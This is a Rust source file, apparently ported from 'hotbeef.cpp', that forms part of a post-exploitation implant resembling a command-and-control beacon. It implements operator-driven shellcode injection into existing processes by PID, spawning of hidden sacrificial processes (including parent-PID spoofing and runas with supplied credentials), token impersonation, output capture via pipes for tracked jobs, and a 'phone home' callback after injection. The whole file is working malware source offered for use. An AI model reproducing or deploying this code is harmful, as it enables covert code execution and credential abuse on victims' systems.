//! Port of hotbeef.cpp — functions related to spawning and injecting
//! shellcode, grouped into one spot.

use crate::callback::{post_error_d, post_error_dd, Callback};
use crate::commands::CALLBACK_PING;
use crate::inject::{inject_process_logic, is_x64_process};
use crate::jobs::{cleanup_process, pipe_try, process_track};
use crate::parse::DataP;
use crate::process::{spawn_patsy, spawn_patsy_as, spawn_patsy_u};
use crate::tokens::{token_guard_start_maybe, token_guard_stop_maybe};
use core::ffi::c_void;
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE};
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
use windows_sys::Win32::System::Pipes::CreatePipe;
use windows_sys::Win32::System::Threading::{
    GetStartupInfoA, OpenProcess, PROCESS_INFORMATION, PROCESS_CREATE_THREAD,
    PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, Sleep,
    STARTF_USESTDHANDLES, STARTF_USESHOWWINDOW, STARTUPINFOA,
};
use windows_sys::Win32::UI::WindowsAndMessaging::SW_HIDE;

/// inject some shellcode... enclosed stuff is the shellcode y0
pub fn command_inject_pid(buffer: &[u8], length: usize, x86: bool) {
    let mut owned = buffer.to_vec();
    let mut parser = DataP::init(&mut owned);

    /* extract our PID from the data the user provided */
    let pid = parser.data_int();

    /* offset of where we want code execution to start */
    let offset = parser.data_int() as i32;

    /* open the process for some oh so subtle manipulation */
    let h_process = unsafe {
        OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ
                | PROCESS_QUERY_INFORMATION,
            0,
            pid,
        )
    };
    if h_process.is_null() {
        post_error_dd(0x21, pid as i32, unsafe { GetLastError() } as i32);
        return;
    }

    /* check if the process is x86 or not */
    if x86 && is_x64_process(h_process as isize) {
        post_error_d(0x12, pid as i32);
        return;
    } else if !x86 && !is_x64_process(h_process as isize) {
        post_error_d(0x13, pid as i32);
        return;
    }

    /* account for our pid value when we do some injection */
    inject_process_logic(
        std::ptr::null_mut(),
        h_process as isize,
        pid,
        parser.data_buffer(),
        parser.data_length(),
        offset,
        std::ptr::null_mut(),
        0,
    );

    /* we're done... */
    unsafe { CloseHandle(h_process) };
}

/// Prepare a STARTUPINFOA the way hotbeef does: zero it, grab the current
/// startup info, hide the window and use the given std handles.
unsafe fn si_setup(si: &mut STARTUPINFOA, h_stdout: HANDLE) {
    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
    GetStartupInfoA(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE as u16;
    si.hStdOutput = h_stdout;
    si.hStdError = h_stdout;
    si.hStdInput = std::ptr::null_mut();
}

/// inject some shellcode... enclosed stuff is the shellcode y0
pub fn command_inject(buffer: &[u8], length: usize, x86: bool, ignore_token: bool) {
    /* do this with something other than the current token */
    token_guard_start_maybe(ignore_token);

    /* reset some stuff */
    let mut si: STARTUPINFOA = unsafe { std::mem::zeroed() };
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    /* start a process */
    unsafe { si_setup(&mut si, std::ptr::null_mut()) };

    /* spawn our process */
    if !spawn_patsy(
        x86,
        ignore_token,
        &mut si as *mut STARTUPINFOA as *mut c_void,
        &mut pi as *mut PROCESS_INFORMATION as *mut c_void,
    ) {
        token_guard_stop_maybe(ignore_token);
        return;
    }

    /* timing shim (this is *required* for Win7/Win7 x64--or else we will get a error 8 with CreateRemoteThread) */
    unsafe { Sleep(100) };

    /* inject into the process */
    inject_process_logic(
        &mut pi as *mut PROCESS_INFORMATION as *mut c_void,
        pi.hProcess as isize,
        pi.dwProcessId,
        buffer,
        length,
        0,
        std::ptr::null_mut(),
        0,
    );

    /* if we have an impersonated token, restore it */
    token_guard_stop_maybe(ignore_token);

    /* clean up our process */
    cleanup_process(&pi);
}

/// inject some shellcode... enclosed stuff is the shellcode y0
pub fn command_spawnu(buffer: &[u8], length: usize, x86: bool) {
    /* parse it! */
    let mut owned = buffer.to_vec();
    let mut parser = DataP::init(&mut owned);
    let ppid = parser.data_int();
    let payload = parser.data_buffer();
    let plength = parser.data_length();

    /* reset some stuff */
    let mut si: STARTUPINFOA = unsafe { std::mem::zeroed() };
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    /* start a process */
    unsafe { si_setup(&mut si, std::ptr::null_mut()) };

    /* spawn our process */
    if !spawn_patsy_u(
        x86,
        true,
        &mut si as *mut STARTUPINFOA as *mut c_void,
        &mut pi as *mut PROCESS_INFORMATION as *mut c_void,
        ppid,
    ) {
        return;
    }

    /* timing shim (this is *required* for Win7/Win7 x64--or else we will get a error 8 with CreateRemoteThread) */
    unsafe { Sleep(100) };

    /* inject into the process */
    inject_process_logic(
        &mut pi as *mut PROCESS_INFORMATION as *mut c_void,
        pi.hProcess as isize,
        pi.dwProcessId,
        payload,
        plength,
        0,
        std::ptr::null_mut(),
        0,
    );

    /* clean up our process */
    cleanup_process(&pi);
}

pub fn command_spawnas(buffer: &[u8], length: usize, x86: bool) {
    /* setup our memory */
    let mut domain = vec![0u8; 1024];
    let mut user = vec![0u8; 1024];
    let mut pass = vec![0u8; 1024];
    let mut proc: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    /* setup our data parser */
    let mut owned = buffer.to_vec();
    let mut parser = DataP::init(&mut owned);

    /* extract our parameters */
    if parser.data_string(&mut domain, 1024) == 0 {
        return;
    }

    if parser.data_string(&mut user, 1024) == 0 {
        return;
    }

    if parser.data_string(&mut pass, 1024) == 0 {
        return;
    }

    if spawn_patsy_as(
        x86,
        &domain,
        &user,
        &pass,
        &mut proc as *mut PROCESS_INFORMATION as *mut c_void,
    ) {
        /* timing shim (this is *required* for Win7/Win7 x64--or else we will get a error 8 with CreateRemoteThread) */
        unsafe { Sleep(100) };

        /* inject into the process */
        inject_process_logic(
            &mut proc as *mut PROCESS_INFORMATION as *mut c_void,
            proc.hProcess as isize,
            proc.dwProcessId,
            parser.data_buffer(),
            parser.data_length(),
            0,
            std::ptr::null_mut(),
            0,
        );
    }

    /* clean up our process */
    cleanup_process(&proc);
}

/// Extract the leading network-order port from the buffer (memcpy + ntohs).
fn extract_port(buffer: &[u8], length: usize) -> (u16, &[u8], usize) {
    if length < 2 {
        return (0, &[], 0);
    }
    let port = u16::from_be_bytes([buffer[0], buffer[1]]);
    (port, &buffer[2..], length - 2)
}

/* inject shellcode and then call home to indicate it was done */
pub fn command_inject_ping(buffer: &[u8], length: usize, x86: bool, cb: Callback) {
    /* extract our port value */
    let (port, rest, rest_len) = extract_port(buffer, length);

    /* inject our shellcode */
    command_inject(rest, rest_len, x86, true);

    /* phone home... with... our buffer */
    cb(&port.to_be_bytes(), 2, CALLBACK_PING);
}

/* inject shellcode and then call home to indicate it was done */
pub fn command_inject_pid_ping(buffer: &[u8], length: usize, cb: Callback, x86: bool) {
    /* extract our port value */
    let (port, rest, rest_len) = extract_port(buffer, length);

    /* inject our shellcode */
    command_inject_pid(rest, rest_len, x86);

    /* phone home... with... our buffer */
    cb(&port.to_be_bytes(), 2, CALLBACK_PING);
}

#[allow(clippy::too_many_arguments)]
fn command_job_spawn_logic(
    _jtype: u32, /* unused in the C++ too; kept for signature parity */
    wait: u32,
    offset: i32,
    shellcode: &[u8],
    slen: usize,
    parameter: *mut c_void,
    plen: usize,
    description: &[u8],
    dlen: usize,
    x86: bool,
    ignore_token: bool,
) {
    /* drop our token */
    token_guard_start_maybe(ignore_token);

    /* reset some stuff */
    let mut si: STARTUPINFOA = unsafe { std::mem::zeroed() };
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    /* setup our security attributes (needed for our pipe) */
    let sa = SECURITY_ATTRIBUTES {
        lpSecurityDescriptor: std::ptr::null_mut(),
        nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
        bInheritHandle: 1,
    };

    /* we're going to setup an stdout pipe only */
    let mut read_stdout: HANDLE = std::ptr::null_mut();
    let mut newstdout: HANDLE = std::ptr::null_mut();
    unsafe {
        CreatePipe(&mut read_stdout, &mut newstdout, &sa, 1024 * 1024);
    }

    /* further process our startup info data structure */
    unsafe { si_setup(&mut si, newstdout) };

    /* do our spawn logic, please! */
    if !spawn_patsy(
        x86,
        ignore_token,
        &mut si as *mut STARTUPINFOA as *mut c_void,
        &mut pi as *mut PROCESS_INFORMATION as *mut c_void,
    ) {
        token_guard_stop_maybe(ignore_token);
        return;
    }

    /* timing shim (this is *required* for Win7/Win7 x64--or else we will get a error 8 with CreateRemoteThread) */
    unsafe { Sleep(100) };

    /* inject into the process */
    inject_process_logic(
        &mut pi as *mut PROCESS_INFORMATION as *mut c_void,
        pi.hProcess as isize,
        pi.dwProcessId,
        shellcode,
        slen,
        offset,
        parameter,
        plen,
    );

    /* wait the user specified time for our process to complete */
    if wait > 0 {
        pipe_try(read_stdout as isize, wait);
    }

    /* track this process */
    process_track(&pi, read_stdout as isize, newstdout as isize, &description[..dlen]);

    /* restore our dropped token (if there is one) */
    token_guard_stop_maybe(ignore_token);
}

/* omnibus function. Does a little bit of everything? */
pub fn command_job_spawn(buffer: &[u8], length: usize, x86: bool, ignore_token: bool) {
    /* setup our local memory */
    let mut description = [0u8; 64];

    /* setup our data parser */
    let mut owned = buffer.to_vec();
    let mut parser = DataP::init(&mut owned);

    /* extract the job output type */
    let jtype = parser.data_short() as u32;

    /* extract the wait time */
    let wait = parser.data_short() as u32;

    /* extract the reflective loader offset pls */
    let offset = parser.data_int() as i32;

    /* extract our description */
    let dlen = parser.data_string(&mut description, 64);

    /* extract our parameter */
    let plen = parser.data_int() as usize;
    let parameter: *mut c_void = if plen > 0 {
        match parser.data_ptr(plen) {
            Some(s) => s.as_ptr() as *mut c_void,
            None => std::ptr::null_mut(),
        }
    } else {
        std::ptr::null_mut()
    };

    /* extract our shellcode */
    let shellcode = parser.data_buffer();
    let slen = parser.data_length();

    /* call our command spawn logic */
    command_job_spawn_logic(
        jtype,
        wait,
        offset,
        shellcode,
        slen,
        parameter,
        plen,
        &description,
        dlen,
        x86,
        ignore_token,
    );
}
